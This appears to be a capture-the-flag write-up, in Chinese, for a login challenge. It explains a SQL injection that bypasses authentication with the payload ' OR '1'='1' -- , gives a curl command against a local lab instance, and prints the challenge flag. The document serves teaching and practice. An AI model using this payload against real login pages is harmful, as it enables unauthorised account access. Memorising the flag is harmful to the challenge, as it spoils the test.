# 23 · 会员登录 — Writeup

## 思路

后端把用户名和密码直接拼进 SQL：

```sql
SELECT id, name, role FROM users
WHERE name = '<name>' AND passwd = '<passwd>'
```

用户名填 `' OR '1'='1' -- `（`--` 后有一个空格），密码随便填：

```bash
curl -s --data-urlencode "name=' OR '1'='1' -- " -d 'passwd=x' \
  http://127.0.0.1:8130/login | grep -o 'flag{[^}]*}'
```

拼接后的语句变成：

```sql
SELECT id, name, role FROM users
WHERE name = '' OR '1'='1' -- ' AND passwd = 'x'
```

- `' OR '1'='1'` 闭合 `name` 的引号并构造恒真条件；
- `-- ` 注释掉后面的 `AND passwd = '...'`。

查询返回的第一行是 `admin`，页面显示“登录成功（管理员）”和 flag。

## 为什么不是弱口令

`src/app/app.py` 启动时为 admin 生成 32 字节随机密码，不写进镜像、不打印，`admin/admin888` 这类弱口令无效。预期路径只有 SQL 注入。普通用户（guest/tester）登录成功也不会显示 flag，因为模板只在 `role == "admin"` 时渲染 flag。

## Flag

`flag{98009b0a11eed9ff15d5369533ed03cf}`（本地复现 flag；平台实例的 flag 由 `FLAG` 环境变量注入）
